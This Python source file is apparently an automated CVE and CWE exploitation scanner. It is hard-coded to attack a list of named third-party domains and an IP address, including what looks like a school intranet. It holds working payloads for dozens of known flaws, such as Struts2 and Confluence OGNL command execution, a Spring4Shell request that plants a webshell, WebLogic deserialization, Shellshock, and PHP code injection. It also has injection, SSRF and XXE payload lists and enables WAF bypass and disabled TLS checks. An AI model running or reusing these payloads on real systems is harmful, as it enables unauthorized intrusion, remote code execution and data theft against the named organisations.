import base64
import http.cookiejar
import json
import math
import re
import socket
import ssl
import sys
import threading
import time
import urllib.error
import urllib.parse
import urllib.request
from concurrent.futures import ThreadPoolExecutor, as_completed
from pathlib import Path
from urllib.parse import quote, urljoin

# ─── WHAT TO SCAN ─────────────────────────────────────────────────────
TARGETS = [
    "http://217.154.18.188",
    "ferrea.com:80",
    "ferrea.com",
    "www.ferrea.com",
    "carpediemacademy-intranet.nebhub4.com",
    "carpediemacademy.org",
    "admarkautomotive.comm",
    "carpediemacademy.org:80",
]

# ─── WHAT TO DO ───────────────────────────────────────────────────────
SCAN_PORTS = True
GRAB_BANNERS = True
FINGERPRINT_HTTP = True
TEST_CVES = True
TEST_CWES = True
LOOKUP_OSV = True
SCAN_SECRETS = True
SCAN_SECRETS_JS = True
BUILD_ATTACK_CHAINS = True

# ─── NETWORK ──────────────────────────────────────────────────────────
INSECURE_TLS = True
PORT_SCAN_TIMEOUT = 10
PORT_SCAN_WORKERS = 50
PROBE_TIMEOUT = 50
TARGET_TIMEOUT = 3000

# ─── PROBING BEHAVIOR ─────────────────────────────────────────────────
PROBE_RATE = 0.5
PROBE_JITTER = 1.0
PROBE_WAF_BYPASS = True

# ─── CUSTOM PORTS (None = use built-in COMMON_PORTS) ──────────────────
CUSTOM_PORTS = None

# ─── AUTH (optional) ──────────────────────────────────────────────────
AUTH_HEADERS = {}
BASIC_AUTH = None
COOKIE = None

# ─── OUTPUT ───────────────────────────────────────────────────────────
OUTPUT_DIR = Path("./scan_output")
SAVE_JSON = True
RESPONSE_EXCERPT_CONFIRMED = 2048
RESPONSE_EXCERPT_OTHER = 256
MAX_JS_FILES = 10
MAX_CHAINS = 50


# ─── LOGGER ───────────────────────────────────────────────────────────
class Log:
    def __init__(self):
        self.messages = []

    def __call__(self, m):
        print(m, flush=True)
        self.messages.append(m)

    def close(self):
        pass


LOG = Log()


def info(m):
    LOG(f"  {m}")


def step(m):
    LOG(f"\n>>> {m}")


def warn(m):
    LOG(f"  \u26a0  {m}")


def err(m):
    LOG(f"  \u2717  {m}")


def tgt(m):
    LOG(f"\n{'=' * 88}\n  {m}\n{'=' * 88}")


ICONS = {
    "HIGH": "\U0001f534",
    "MEDIUM": "\U0001f7e0",
    "LOW": "\U0001f7e1",
    "INFO": "\u2139\ufe0f",
}
DEFAULT_BULLET = "\u2022"


def finding(priority, name, detail):
    p = str(priority) if priority is not None else "INFO"
    n = str(name) if name is not None else "-"
    d = str(detail) if detail is not None else ""
    icon = ICONS.get(p, DEFAULT_BULLET)
    LOG(f"  {icon} [{p:>6}] {n:<22} {d}")


def confirmed(name, method, evidence):
    n = str(name) if name is not None else "-"
    m = str(method) if method is not None else "-"
    e = str(evidence) if evidence is not None else ""
    LOG(f"  \u2713 CONFIRMED  {n}  ({m})")
    LOG(f"      evidence: {e[:200]}")


# ─── HTTP ─────────────────────────────────────────────────────────────
class Resp:
    __slots__ = (
        "status_code",
        "headers",
        "text",
        "content",
        "url",
        "elapsed_seconds",
    )

    def __init__(self, st, h, b, u, el):
        self.status_code = st
        self.headers = h
        self.url = u
        self.elapsed_seconds = el
        self.text = b.decode("utf-8", "replace") if isinstance(b, bytes) else (b or "")
        self.content = b if isinstance(b, bytes) else (b or "").encode()

    def header(self, name):
        target = name.lower()
        for k, v in self.headers.items():
            if str(k).lower() == target:
                return str(v)
        return ""


class _NoRedirect(urllib.request.HTTPRedirectHandler):
    def redirect_request(self, *a, **k):
        return None


def _opener(jar, follow):
    ctx = ssl.create_default_context()
    if INSECURE_TLS:
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
    hs = [
        urllib.request.HTTPCookieProcessor(jar),
        urllib.request.HTTPSHandler(context=ctx),
    ]
    if not follow:
        hs.append(_NoRedirect())
    return urllib.request.build_opener(*hs)


class Session:
    def __init__(self):
        self.jar = http.cookiejar.CookieJar()
        self.follow = _opener(self.jar, True)
        self.nofollow = _opener(self.jar, False)

    def request(
        self,
        method,
        url,
        params=None,
        data=None,
        json_body=None,
        headers=None,
        timeout=15,
        allow_redirects=False,
    ):
        if params:
            url += ("&" if "?" in url else "?") + urllib.parse.urlencode(params)
        h = dict(AUTH_HEADERS)
        h.update(headers or {})
        if COOKIE:
            h["Cookie"] = COOKIE
        body = None
        if json_body is not None:
            body = json.dumps(json_body).encode()
            h.setdefault("Content-Type", "application/json")
        elif data is not None:
            if isinstance(data, dict):
                body = urllib.parse.urlencode(data).encode()
            elif isinstance(data, str):
                body = data.encode()
            else:
                body = data
            h.setdefault("Content-Type", "application/x-www-form-urlencoded")
        if BASIC_AUTH:
            h["Authorization"] = "Basic " + base64.b64encode(
                f"{BASIC_AUTH[0]}:{BASIC_AUTH[1]}".encode()
            ).decode()
        h.setdefault("User-Agent", "cve-scanner/14.0")
        req = urllib.request.Request(url, data=body, headers=h, method=method.upper())
        op = self.follow if allow_redirects else self.nofollow
        t0 = time.monotonic()
        try:
            r = op.open(req, timeout=timeout)
            return Resp(
                r.status, dict(r.headers), r.read(), r.url, time.monotonic() - t0
            )
        except urllib.error.HTTPError as e:
            try:
                b = e.read()
            except Exception:
                b = b""
            return Resp(e.code, dict(e.headers or {}), b, url, time.monotonic() - t0)
        except Exception:
            return None

    def get(self, url, **k):
        return self.request("GET", url, **k)

    def post(self, url, **k):
        return self.request("POST", url, **k)


# ─── CVE PROBES ───────────────────────────────────────────────────────
CVE_PROBES = {
    "CVE-2021-41773": {
        "label": "Apache 2.4.49 Path Traversal",
        "probes": [
            {
                "path": "/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd",
                "sig": {"passwd": r"root:[x*]?:0:0:"},
            }
        ],
    },
    "CVE-2021-42013": {
        "label": "Apache 2.4.50 Path Traversal",
        "probes": [
            {
                "path": "/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/etc/passwd",
                "sig": {"passwd": r"root:[x*]?:0:0:"},
            }
        ],
    },
    "CVE-2019-19781": {
        "label": "Citrix ADC Path Traversal",
        "probes": [
            {"path": "/vpn/../vpns/cfg/smb.conf", "sig": {"smb": r"\[global\]"}}
        ],
    },
    "CVE-2019-11510": {
        "label": "Pulse Secure Path Traversal",
        "probes": [
            {
                "path": "/dana-na/../dana/html5acc/guacamole/../../../../../../../etc/passwd?/dana/html5acc/guacamole/",
                "sig": {"passwd": r"root:[x*]?:0:0:"},
            }
        ],
    },
    "CVE-2018-13379": {
        "label": "FortiOS SSL VPN Path Traversal",
        "probes": [
            {
                "path": "/remote/fgt_lang?lang=/../../../..///////////dev/cmdb/sslvpn_websession",
                "sig": {"fgt": r"var fgt_lang"},
            }
        ],
    },
    "CVE-2022-1388": {
        "label": "F5 BIG-IP Auth Bypass",
        "probes": [
            {
                "method": "POST",
                "path": "/mgmt/tm/util/bash",
                "headers": {
                    "X-F5-Auth-Token": "x",
                    "Connection": "X-F5-Auth-Token",
                    "Content-Type": "application/json",
                },
                "json_body": {"command": "run", "utilCmdArgs": "-c id"},
                "require_status": [200],
                "sig": {"f5": r"\"commandResult\"|\"kind\":\"tm:util:bash:runstate\""},
            }
        ],
    },
    "CVE-2020-14882": {
        "label": "WebLogic Auth Bypass",
        "probes": [
            {
                "path": "/console/css/%252e%252e%252fconsole.portal?_nfpb=true&_pageLabel=&handle=com.tangosol.coherence.mvel2.sh.ShellSession('weblogic.work.ExecuteThread.currentThread().getContextClassLoader()')",
                "require_status": [200],
                "sig": {"weblogic": r"WebLogic|console\.portal|Oracle"},
            }
        ],
    },
    "CVE-2020-14883": {
        "label": "WebLogic Auth Bypass 2",
        "probes": [
            {
                "path": "/console/css/%252e%252e%252f/consolejndi.portal?_nfpb=true&_pageLabel=JNDIBindingPage&handle=com.bea.console.handles.JndiBindingHandle",
                "require_status": [200],
                "sig": {"wl2": r"WebLogic|JNDI|console"},
            }
        ],
    },
    "CVE-2023-22515": {
        "label": "Confluence Broken Access Control",
        "probes": [
            {
                "path": "/setup/setupadministrator.action",
                "require_status": [200],
                "sig": {"setup": r"<title>Setup System Administrator"},
            }
        ],
    },
    "CVE-2023-22527": {
        "label": "Confluence SSTI RCE",
        "probes": [
            {
                "method": "POST",
                "path": "/template/aui/text-inline.vm",
                "headers": {"Content-Type": "application/x-www-form-urlencoded"},
                "data": "label=Hello\\u0027\\u0022\\u002b7*7\\u002b\\u0022&velocity=1",
                "sig": {"conf_ssti": r"49|Confluence|velocity|SSTI"},
            }
        ],
    },
    "CVE-2024-1709": {
        "label": "ScreenConnect Auth Bypass",
        "probes": [
            {
                "path": "/SetupWizard.aspx/../../ScreenConnect/Login.aspx",
                "require_status": [200],
                "sig": {"sc": r"ScreenConnect|Login\.aspx"},
            }
        ],
    },
    "CVE-2023-27350": {
        "label": "PaperCut Auth Bypass",
        "probes": [
            {
                "path": "/app?service=page/SetupCompleted",
                "require_status": [200],
                "sig": {"pc": r"PaperCut|SetupCompleted"},
            }
        ],
    },
    "CVE-2021-40539": {
        "label": "ManageEngine Auth Bypass",
        "probes": [{"path": "/./", "sig": {"me": r"ManageEngine|ADSelfService"}}],
    },
    "CVE-2022-40684": {
        "label": "FortiOS Auth Bypass",
        "probes": [
            {
                "path": "/api/v2/cmdb/system/admin/root",
                "headers": {"Forwarded": 'for="[127.0.0.1]:80";by="[127.0.0.1]:80";'},
                "sig": {"fgt_admin": r"\"http_method\"|\"trusthost\"|\"accprofile\""},
            }
        ],
    },
    "CVE-2017-5638": {
        "label": "Struts2 S2-045 RCE",
        "probes": [
            {
                "method": "GET",
                "path": "/",
                "headers": {
                    "Content-Type": "%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='id').(#cmds={'/bin/bash','-c',#cmd}).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"
                },
                "sig": {"uid": r"uid=\d+\([^)]*\)"},
            }
        ],
    },
    "CVE-2022-26134": {
        "label": "Confluence OGNL Injection",
        "probes": [
            {
                "path": "/%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.getInputStream%28%29%2C%22utf-8%22%29%29%7D%2F.%2F",
                "sig": {"c": r"Confluence|OGNL|X-CVE-PROBE"},
            }
        ],
    },
    "CVE-2021-26084": {
        "label": "Confluence Pre-Auth OGNL",
        "probes": [
            {
                "method": "POST",
                "path": "/pages/doenterpagevariables.action",
                "headers": {"Content-Type": "application/x-www-form-urlencoded"},
                "data": "queryString=%5Cu0027%2B%7BClass.forName%28%5Cu0027java.lang.Runtime%5Cu0027%29.getMethod%28%5Cu0027getRuntime%5Cu0027%2Cnull%29.invoke%28null%2Cnull%29.exec%28%5Cu0027id%5Cu0027%29%7D",
                "sig": {"c_err": r"Confluence|OGNL|XPathException"},
            }
        ],
    },
    "CVE-2023-34362": {
        "label": "MOVEit SQLi RCE",
        "probes": [
            {
                "path": "/human2.aspx",
                "sig": {"m": r"System\.Data\.SqlClient|SqlException|MOVEit"},
            }
        ],
    },
    "CVE-2018-7600": {
        "label": "Drupalgeddon2 RCE",
        "probes": [
            {
                "path": "/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax",
                "sig": {"d": r"root:[x*]?:0:0:|uid=\d+"},
            }
        ],
    },
    "CVE-2022-22965": {
        "label": "Spring4Shell RCE",
        "probes": [
            {
                "method": "POST",
                "path": "/",
                "data": "class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20new%20java.io.BufferedReader(new%20java.io.InputStreamReader(%25%7Bc2%7Di.getRuntime().exec(new%20String%5B%5D%7B%22%2Fbin%2Fsh%22%2C%22-c%22%2Crequest.getParameter(%22cmd%22)%7D).getInputStream())).readLine()%3B%20%7D%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=shell&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=",
                "sig": {"spring": r"shell\.jsp|Spring"},
            }
        ],
    },
    "CVE-2024-21887": {
        "label": "Ivanti Command Injection",
        "probes": [
            {
                "path": "/api/v1/totp/user-backup-code/../../system/system-information",
                "sig": {"iv": r"Ivanti|Connect Secure|Pulse"},
            }
        ],
    },
    "CVE-2024-21893": {
        "label": "Ivanti SSRF",
        "probes": [
            {
                "method": "POST",
                "path": "/dana-ws/saml20.ws",
                "headers": {"Content-Type": "text/xml"},
                "data": '<?xml version="1.0"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><Get>/</Get></soap:Body></soap:Envelope>',
                "sig": {"iv_ssrf": r"Ivanti|Pulse|SAML|saml20"},
            }
        ],
    },
    "CVE-2023-0669": {
        "label": "GoAnywhere Deserialization",
        "probes": [
            {"path": "/goanywhere/lic/accept", "sig": {"ga": r"GoAnywhere|lic/accept"}}
        ],
    },
    "CVE-2024-0204": {
        "label": "GoAnywhere Auth Bypass",
        "probes": [
            {
                "path": "/goanywhere/images/..;/wizard/InitialAccountSetup.xhtml",
                "require_status": [200],
                "sig": {"ga_setup": r"Initial Account|Create Administrator|GoAnywhere"},
            }
        ],
    },
    "CVE-2022-42475": {
        "label": "FortiOS SSL-VPN Overflow",
        "probes": [{"path": "/remote/error", "sig": {"f": r"FortiOS|SSL-VPN"}}],
    },
    "CVE-2022-47966": {
        "label": "ManageEngine SAML RCE",
        "probes": [
            {"path": "/SamlResponseServlet", "sig": {"me": r"ManageEngine|SAML"}}
        ],
    },
    "CVE-2020-5902": {
        "label": "F5 BIG-IP TMUI RCE",
        "probes": [
            {
                "path": "/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+/etc/passwd",
                "sig": {"f5": r"root:[x*]?:0:0:|admin|tmsh"},
            }
        ],
    },
    "CVE-2021-26855": {
        "label": "Exchange ProxyLogon",
        "probes": [
            {
                "path": "/ecp/x.jsx",
                "headers": {
                    "Cookie": "X-AnonResource=true; X-AnonResource-Backend=localhost/ecp/default.flt"
                },
                "sig": {"pl": r"Negotiate|X-BEResource|X-CalculatedBETarget"},
            }
        ],
    },
    "CVE-2021-34473": {
        "label": "Exchange ProxyShell",
        "probes": [
            {
                "path": "/autodiscover/autodiscover.json?@test.com/owa/?&Email=autodiscover/autodiscover.json%3F@test.com&Protocol=XYZ&Mailbox=autodiscover/autodiscover.json%3F@test.com",
                "sig": {"ps": r"X-FEServer|X-BackEndCookie|autodiscover"},
            }
        ],
    },
    "CVE-2021-21972": {
        "label": "vCenter vROPs RCE",
        "probes": [
            {
                "method": "POST",
                "path": "/ui/vropspluginui/rest/services/uploadova",
                "headers": {"Content-Type": "application/octet-stream"},
                "data": "BOUNDARY",
                "sig": {"v": r"vropspluginui|uploadova|vROPs"},
            }
        ],
    },
    "CVE-2021-21985": {
        "label": "vCenter vSAN RCE",
        "probes": [
            {
                "path": "/ui/h5-vsan/rest/proxy/service/&vsanProviderUtils_setVrUsageDisabled/setTarget/",
                "sig": {"vs": r"vsanProviderUtils|h5-vsan"},
            }
        ],
    },
    "CVE-2024-3400": {
        "label": "PAN-OS GlobalProtect Cmd Injection",
        "probes": [
            {
                "path": "/global-protect/login.esp",
                "headers": {
                    "Cookie": "SESSID=/../../../var/appweb/sslvpndocs/global-protect/portal/images/cve-2024-3400.txt"
                },
                "sig": {"po": r"GlobalProtect|PanOS|Palo Alto"},
            }
        ],
    },
    "CVE-2019-2725": {
        "label": "WebLogic wls-wsat Deserialization",
        "probes": [
            {
                "method": "POST",
                "path": "/wls-wsat/CoordinatorPortType",
                "headers": {"Content-Type": "text/xml"},
                "data": '<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"><soapenv:Header><work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/"><java version="1.8" class="java.beans.XMLDecoder"><void class="java.lang.ProcessBuilder"><array class="java.lang.String" length="1"><void index="0"><string>/bin/id</string></void></array><void method="start"/></void></java></work:WorkContext></soapenv:Header><soapenv:Body/></soapenv:Envelope>',
                "sig": {"wl": r"wls-wsat|WebLogic|X-CVE-PROBE"},
            }
        ],
    },
    "CVE-2016-4437": {
        "label": "Shiro rememberMe Deserialization",
        "probes": [
            {
                "path": "/",
                "headers": {
                    "Cookie": "rememberMe=rO0ABXNyAA1qYXZhLnV0aWwuTWFwASJV+1PjCyYCAAB4cHcIAAAAATAAc3IADGphdmEubGFuZy5Mb25n7Xpr+KiN7SgCAAB4cgAQamF2YS5sYW5nLk51bWJlcoVr66C8Z6HqAgABTAAKdmFsdWVMb25ndAAPTGphdmEvbGFuZy9Mb25nO3hwdAAIAAAAAAAAAAE="
                },
                "sig": {"sh": r"rememberMe|Shiro|deleteMe|X-CVE-PROBE"},
            }
        ],
    },
    "CVE-2023-4966": {
        "label": "Citrix Bleed",
        "probes": [
            {
                "path": "/oauth/idp/.well-known/openid-configuration",
                "headers": {"Host": "a" * 24576 + ".example.com"},
                "require_status": [200],
                "sig": {"cb": r"ctx\.session|citrix_session|NSC_[A-Za-z0-9]{20,}"},
            }
        ],
    },
    "CVE-2024-4577": {
        "label": "PHP CGI Argument Injection",
        "probes": [
            {
                "path": "/index.php?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input",
                "headers": {"Content-Type": "application/x-www-form-urlencoded"},
                "data": "<?php echo 'CVE-2024-4577-MARKER'; ?>",
                "sig": {"p": r"CVE-2024-4577-MARKER"},
            }
        ],
    },
    "CVE-2021-44228": {
        "label": "Log4Shell JNDI",
        "probes": [
            {
                "path": "/",
                "headers": {"X-Api-Version": "${jndi:ldap://127.0.0.1:1389/a}"},
                "sig": {
                    "log4j": r"javax\.naming\.CommunicationException|JNDI|lookup.*failed|LDAP.*error"
                },
            }
        ],
    },
    "CVE-2023-46604": {
        "label": "ActiveMQ OpenWire RCE",
        "probes": [
            {
                "method": "POST",
                "path": "/api/",
                "headers": {"Content-Type": "application/x-www-form-urlencoded"},
                "data": '<?xml version="1.0"?><beans xmlns="http://www.springframework.org/schema/beans"><bean class="java.lang.ProcessBuilder"><constructor-arg><list><value>id</value></list></constructor-arg></bean></beans>',
                "require_status": [200, 500],
                "sig": {
                    "amq": r"ClassNotFound|ProcessBuilder|ActiveMQ.*Exception|javax\.xml"
                },
            }
        ],
    },
    "CVE-2023-28432": {
        "label": "MinIO Env Leak",
        "probes": [
            {
                "method": "POST",
                "path": "/minio/bootstrap/v1/verify",
                "headers": {"Content-Type": "application/x-www-form-urlencoded"},
                "data": "",
                "require_status": [200],
                "sig": {
                    "minio_env": r"MINIO_ROOT_USER|MINIO_ROOT_PASSWORD|MINIO_\w+=.+"
                },
            }
        ],
    },
    "CVE-2024-27198": {
        "label": "TeamCity Auth Bypass",
        "probes": [
            {
                "path": "/app/rest/users/id:1/tokens",
                "require_status": [200],
                "sig": {"tc_token": r"<tokens>|<user\b|<token\b"},
            },
            {
                "path": "/app/rest/server?jsp=/app/rest/server;.jsp",
                "require_status": [200],
                "sig": {"tc_server": r"TeamCity|internalVersion|server version"},
            },
        ],
    },
    "CVE-2024-23897": {
        "label": "Jenkins CLI File Read",
        "probes": [
            {
                "path": "/cli?remoting=false",
                "headers": {"Session": "abcd1234", "Side": "download"},
                "sig": {"jenkins": r"Jenkins CLI|hudson\.cli|v2\.\d+"},
            },
            {
                "path": "/jnlpJars/jenkins-cli.jar",
                "require_status": [200],
                "sig": {"jenkins_jar": r"PK\x03\x04|jenkins-cli"},
            },
        ],
    },
    "CVE-2021-3129": {
        "label": "Laravel Ignition RCE",
        "probes": [
            {
                "method": "POST",
                "path": "/_ignition/execute-solution",
                "headers": {
                    "Content-Type": "application/json",
                    "Accept": "application/json",
                },
                "json_body": {
                    "solution": "Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution",
                    "parameters": {
                        "variableName": "x",
                        "viewFile": "php://filter/read=convert.base64-encode/resource=../../../../etc/passwd",
                    },
                },
                "require_status": [200, 500],
                "sig": {
                    "lara": r"Ignition|viewFile|php://filter|MakeViewVariableOptionalSolution"
                },
            }
        ],
    },
    "CVE-2017-10271": {
        "label": "WebLogic XMLDecoder RCE",
        "probes": [
            {
                "method": "POST",
                "path": "/wls-wsat/CoordinatorPortType",
                "headers": {"Content-Type": "text/xml"},
                "data": '<?xml version="1.0"?><soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"><soapenv:Header><work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/"><java version="1.8" class="java.beans.XMLDecoder"><object class="java.lang.ProcessBuilder"><array class="java.lang.String" length="1"><void index="0"><string>id</string></void></array><void method="start"/></object></java></work:WorkContext></soapenv:Header><soapenv:Body/></soapenv:Envelope>',
                "require_status": [200, 500],
                "sig": {
                    "wl_xml": r"wls-wsat|WebLogic|XMLDecoder|CoordinatorPortType"
                },
            }
        ],
    },
    "CVE-2022-30525": {
        "label": "Zyxel Command Injection",
        "probes": [
            {
                "method": "POST",
                "path": "/ztp/cgi-bin/handler",
                "headers": {"Content-Type": "application/json"},
                "json_body": {"command": ";id;", "setId": "0"},
                "sig": {"zyxel": r"uid=\d+\(|Zyxel|zyxel"},
            }
        ],
    },
    "CVE-2023-36845": {
        "label": "Juniper PHP Env Override",
        "probes": [
            {
                "method": "POST",
                "path": "/?PHPRC=/dev/fd/0",
                "headers": {"Content-Type": "application/x-www-form-urlencoded"},
                "data": 'auto_prepend_file="/etc/passwd"',
                "sig": {"juniper": r"root:[x*]?:0:0:|Juniper|juniper"},
            }
        ],
    },
    "CVE-2024-3273": {
        "label": "D-Link Backdoor Cmd Injection",
        "probes": [
            {
                "path": "/cgi-bin/nas_sharing.cgi?user=messagebus&passwd=&cmd=15&system=aWQ=",
                "require_status": [200],
                "sig": {"dlink": r"uid=\d+\(|gid=\d+\("},
            }
        ],
    },
    "CVE-2022-35914": {
        "label": "GLPI RCE",
        "probes": [
            {
                "method": "POST",
                "path": "/vendor/htmlawed/htmlawed/htmLawedTest.php",
                "headers": {"Content-Type": "application/x-www-form-urlencoded"},
                "data": "sid=foo&text=phpinfo()&hhook=array_filter&function=assert",
                "require_status": [200],
                "sig": {"glpi": r"PHP Version|phpinfo|GLPI"},
            }
        ],
    },
    "CVE-2023-3519": {
    "label": "Citrix ADC / NetScaler (CVE-2023-3519)",
    "probes": [
        {
            "path": "/nitro/v1/config/nsversion",
            "require_status": [200],
            "version_sig": {
                "pattern": r'"version"\s*:\s*"([\d.]+-[\d.]+)"',
                "vulnerable_below": ["13.1-49.15", "13.0-92.19", "12.1-65.35"],
            },
        },
    ],
    },
    "CVE-2019-6340": {
        "label": "Drupal REST RCE",
        "probes": [
            {
                "method": "POST",
                "path": "/node/1?_format=hal_json",
                "headers": {"Content-Type": "application/hal+json"},
                "json_body": {"link": {"value": "link"}},
                "require_status": [200, 403],
                "sig": {"drupal_rest": r"Drupal|hal_json|Symfony\\\\Component"},
            }
        ],
    },
    "CVE-2014-6271": {
        "label": "Shellshock",
        "probes": [
            {
                "path": "/cgi-bin/status",
                "headers": {"User-Agent": "() { :;}; echo; echo shellshock-vulnerable"},
                "sig": {"bash": r"shellshock-vulnerable"},
            },
            {
                "path": "/cgi-bin/test.cgi",
                "headers": {"User-Agent": "() { :;}; echo; echo shellshock-vulnerable"},
                "sig": {"bash": r"shellshock-vulnerable"},
            },
        ],
    },
    "CVE-2017-9841": {
        "label": "PHPUnit RCE",
        "probes": [
            {
                "method": "POST",
                "path": "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
                "data": "<?php echo 'PHPUNIT-CVE-2017-9841'; ?>",
                "sig": {"phpunit": r"PHPUNIT-CVE-2017-9841"},
            }
        ],
    },
    "CVE-2022-22947": {
        "label": "Spring Cloud Gateway RCE",
        "probes": [
            {
                "method": "POST",
                "path": "/actuator/gateway/routes/x",
                "headers": {"Content-Type": "application/json"},
                "json_body": {
                    "id": "x",
                    "filters": [
                        {
                            "name": "AddResponseHeader",
                            "args": {
                                "name": "Result",
                                "value": "#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{\"id\"}).getInputStream()))}",
                            },
                        }
                    ],
                    "uri": "http://example.com",
                    "predicates": [{"name": "Path", "args": {"_genkey_0": "/x"}}],
                },
                "sig": {"gateway": r"AddResponseHeader|gateway|actuator"},
            }
        ],
    },
    "CVE-2023-32315": {
        "label": "Openfire Auth Bypass",
        "probes": [
            {
                "path": "/setup/setup-profile-settings.jsp?username=admin&password=admin&confirm=admin",
                "require_status": [200],
                "sig": {"openfire": r"Openfire|setup-profile-settings|Setup Complete"},
            }
        ],
    },
    "CVE-2022-22963": {
        "label": "Spring Cloud Function SpEL",
        "probes": [
            {
                "method": "POST",
                "path": "/functionRouter",
                "headers": {
                    "Content-Type": "text/plain",
                    "spring.cloud.function.routing-expression": "T(java.lang.Runtime).getRuntime().exec(\"id\")",
                },
                "data": "x",
                "sig": {"scf": r"spring|expression|SpEL|Exception"},
            }
        ],
    },
    "CVE-2021-22986": {
        "label": "F5 iControl REST RCE",
        "probes": [
            {
                "method": "POST",
                "path": "/mgmt/shared/authn/login",
                "headers": {"Content-Type": "application/json"},
                "json_body": {
                    "username": "admin",
                    "password": "",
                    "loginProviderName": "tmos",
                },
                "sig": {"f5_i": r"uid=\d+\(|F5|BIG-IP|commandResult"},
            }
        ],
    },
}

SQL_SIGS = [
    (
        "mysql",
        r"SQL syntax.*MySQL|MySqlException|com\.mysql\.jdbc|MariaDB server version",
    ),
    ("postgresql", r"PostgreSQL.*ERROR|PSQLException|syntax error at or near"),
    ("oracle", r"ORA-\d{5}|oracle\.jdbc"),
    (
        "mssql",
        r"Microsoft.*ODBC.*SQL Server|SqlException|System\.Data\.SqlClient|Incorrect syntax near",
    ),
    ("sqlite", r"SQLite\.Exception|\[SQLITE_ERROR\]"),
]
RCE_SIGS = [
    ("uid_gid", r"uid=\d+\([^)]*\)\s+gid=\d+\([^)]*\)"),
    ("www_data", r"www-data:"),
    ("root_shell", r"root@[a-zA-Z0-9_-]+:"),
]
XSS_SIGS = {
    "raw_script": r"(?i)<script[^>]*>.*?</script>",
    "svg_onload": r"(?i)<svg[^>]+onload\s*=",
    "img_onerror": r"(?i)<img[^>]+onerror\s*=",
    "javascript_uri": r"(?i)javascript\s*:\s*[^\s\"']",
}
SSTI_SIGS = {
    "jinja": r"jinja2\.exceptions\.",
    "twig": r"Twig\\Error\\",
    "freemarker": r"freemarker\.core\.ParseException",
    "e49": r"(?<![\d])49(?![\d])",
    "e79m": r"(?<![\d])79005424(?![\d])",
}
REDIR_SIGS = {
    "evil": r"(?m)^Location\s*:\s*https?://[^/\s]*evil",
    "protorel": r"(?m)^Location\s*:\s*//evil",
}

CWE_PROBES = {
    "CWE-79": {
        "label": "XSS (reflected)",
        "detect": "xss_reflection",
        "markers": ["XSSMARK1", "XSSMARK2", "XSSMARK3"],
        "payloads": [
            '<svg/onload=alert("XSSMARK1")>',
            '"><script>alert("XSSMARK2")</script>',
            "'><img src=x onerror=alert('XSSMARK3')>",
        ],
    },
    "CWE-89": {
        "label": "SQL Injection",
        "detect": "sql",
        "timing_threshold": 3.0,
        "payloads": ["' OR SLEEP(4)-- -", "' AND SLEEP(4)-- -", "'", '"'],
    },
    "CWE-22": {
        "label": "Path Traversal",
        "detect": "pattern",
        "payloads": [
            "../../../../../../etc/passwd",
            "....//....//....//....//etc/passwd",
            "..\\..\\..\\..\\windows\\win.ini",
        ],
        "signatures": {"passwd": r"root:[x*]?:0:0:", "win_ini": r"\[fonts\]"},
    },
    "CWE-78": {
        "label": "Command Injection",
        "detect": "rce",
        "timing_threshold": 3.0,
        "payloads": [";sleep 4;", "|id", "|sleep 4", "$(sleep 4)"],
    },
    "CWE-94": {
        "label": "SSTI",
        "detect": "ssti",
        "expected": "79005424",
        "payloads": ["{{8888*8888}}", "${8888*8888}", "<%= 8888*8888 %>", "{{7*7}}"],
    },
    "CWE-918": {
        "label": "SSRF",
        "detect": "pattern",
        "payloads": [
            "http://169.254.169.254/latest/meta-data/",
            "http://127.0.0.1:80/",
            "file:///etc/passwd",
        ],
        "signatures": {
            "aws_imds": r"ami-id|instance-id",
            "gcp": r"metadata\.google\.internal",
            "file_proto": r"root:[x*]?:0:0:",
        },
    },
    "CWE-611": {
        "label": "XXE",
        "detect": "pattern",
        "payloads": [
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>'
        ],
        "signatures": {"passwd": r"root:[x*]?:0:0:", "libxml": r"libxml2"},
    },
    "CWE-502": {
        "label": "Insecure Deserialization",
        "detect": "pattern",
        "payloads": ['O:8:"stdClass":1:{s:4:"test";s:4:"pwn3";}'],
        "signatures": {
            "java_magic": r"rO0AB",
            "php_ser": r"O:\d+:\"",
            "pickle": r"_pickle\.UnpicklingError",
        },
    },
    "CWE-601": {
        "label": "Open Redirect",
        "detect": "redirect",
        "expected": "evil.example.com",
        "payloads": [
            "https://evil.example.com/",
            "//evil.example.com/",
            "/\\evil.example.com/",
        ],
    },
